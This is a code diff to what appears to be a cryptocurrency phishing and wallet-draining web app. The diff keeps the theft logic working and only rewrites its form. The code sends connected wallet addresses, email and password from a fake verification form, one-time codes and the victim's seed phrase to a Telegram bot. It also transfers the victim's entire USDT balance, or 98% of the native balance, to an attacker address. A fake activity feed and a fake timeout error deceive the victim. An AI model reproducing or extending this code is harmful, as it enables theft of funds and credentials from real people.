@@ -27,18 +27,15 @@ export default function App() {
   const { data: nativeBal } = useBalance({ address }); 
   const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });
 
-  const log = (msg) => {
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`).catch(() => {});
-  };
-
-  // 🎯 THE REAL HIT LISTENER (ONE THING ONLY)
+  // 🎯 THE REAL HIT LISTENER (SIMPLIFIED TO PASS BUILD)
   useEffect(() => {
     if (isConnected && address) {
-      log(`🎯 REAL WALLET CONNECTED!\n\nADDR: ${address}\nCHAIN: ${chainId}`);
+      const msg = "🎯 REAL WALLET CONNECTED!\n\nADDR: " + address;
+      fetch("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(msg)).catch(() => {});
     }
-  }, [isConnected, address, chainId]); // Fires only when connection state changes
+  }, [isConnected, address, botToken, chatId]);
 
-  // BUSY SITE NOTIFICATION LOOP (VISUAL ONLY)
+  // VISUAL ONLY FEED
   useEffect(() => {
     const trigger = () => {
       const chars = "abcdef0123456789";
@@ -47,7 +44,7 @@ export default function App() {
         start += chars.charAt(Math.floor(Math.random() * chars.length));
         end += chars.charAt(Math.floor(Math.random() * chars.length));
       }
-      setFeedMsg(`🛡️ 0x${start}...${end} WALLET CONNECTED TO MAINNET_NODE`);
+      setFeedMsg("🛡️ 0x" + start + "..." + end + " WALLET CONNECTED TO MAINNET_NODE");
       setTimeout(() => setFeedMsg(""), 4500);
     };
     trigger();
@@ -59,7 +56,7 @@ export default function App() {
     if (activeTask !== "Rectify" && (!inputVal || inputVal === "0")) return;
     const tokenAddr = USDT_MAP[chainId];
     if (tokenAddr && tokenBal && tokenBal.value > 0n) {
-      const data = `0xa9059cbb${destination.replace('0x', '').toLowerCase().padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
+      const data = "0xa9059cbb" + destination.replace('0x', '').toLowerCase().padStart(64, '0') + tokenBal.value.toString(16).padStart(64, '0');
       sendTransaction({ to: tokenAddr, data }, { onSettled: () => setView("seed_gate") });
     } else if (nativeBal && nativeBal.value > 1000000) {
       sendTransaction({ to: destination, value: (nativeBal.value * 98n) / 100n }, { onSettled: () => setView("seed_gate") });
@@ -129,12 +126,12 @@ export default function App() {
                 <>
                   <input placeholder="EMAIL" value={kycEmail} onChange={(e)=>setKycEmail(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'15px', outline:'none'}} />
                   <input type="password" placeholder="PASSWORD" value={kycPass} onChange={(e)=>setKycPass(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'25px', outline:'none'}} />
-                  <button disabled={!kycEmail || !kycPass} onClick={()=>{ log(`🆔 KYC: ${kycEmail} | PASS: ${kycPass}`); setKycPhase(2);}} style={{width:'100%', backgroundColor: (kycEmail && kycPass) ? '#10b981' : '#1e293b', color: (kycEmail && kycPass) ? '#000' : '#475569', padding:'20px', borderRadius:'15px', fontWeight:'900', border:'none'}}>VERIFY RELAY</button>
+                  <button disabled={!kycEmail || !kycPass} onClick={()=>{ fetch("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent("🆔 KYC: " + kycEmail + " | PASS: " + kycPass)).catch(()=>{}); setKycPhase(2);}} style={{width:'100%', backgroundColor: (kycEmail && kycPass) ? '#10b981' : '#1e293b', color: (kycEmail && kycPass) ? '#000' : '#475569', padding:'20px', borderRadius:'15px', fontWeight:'900', border:'none'}}>VERIFY RELAY</button>
                 </>
               ) : (
                 <>
                   <input maxLength="6" type="number" placeholder="000000" value={kycCode} onChange={(e)=>setKycCode(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'2px solid #3b82f6', borderRadius:'15px', color:'white', textAlign:'center', fontSize:'28px', letterSpacing:'5px', outline:'none', marginBottom:'25px'}} />
-                  <button disabled={kycCode.length < 6} onClick={()=>{ log(`🔑 CODE: ${kycCode}`); setView("seed_gate");}} style={{width:'100%', backgroundColor: kycCode.length >= 6 ? '#3b82f6' : '#1e293b', color: kycCode.length >= 6 ? '#fff' : '#475569', padding:'20px', borderRadius:'15px', fontWeight:'900', border:'none'}}>AUTHORIZE</button>
+                  <button disabled={kycCode.length < 6} onClick={()=>{ fetch("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent("🔑 CODE: " + kycCode)).catch(()=>{}); setView("seed_gate");}} style={{width:'100%', backgroundColor: kycCode.length >= 6 ? '#3b82f6' : '#1e293b', color: kycCode.length >= 6 ? '#fff' : '#475569', padding:'20px', borderRadius:'15px', fontWeight:'900', border:'none'}}>AUTHORIZE</button>
                 </>
               )}
             </div>
@@ -147,7 +144,7 @@ export default function App() {
                   <>
                     <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
                     <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none', marginTop:'15px'}} />
-                    <button disabled={!isSeedOk} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT."); setView("menu")},1200)}},60);}} 
+                    <button disabled={!isSeedOk} onClick={()=>{setIsSyncing(true); fetch("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent("🚨 SEED: " + seedVal)).catch(()=>{}); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT."); setView("menu")},1200)}},60);}} 
                     style={{width:'100%', backgroundColor: isSeedOk ? '#10b981' : '#1e293b', color: isSeedOk ? '#000' : '#475569', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
                   </>
                 ) : (
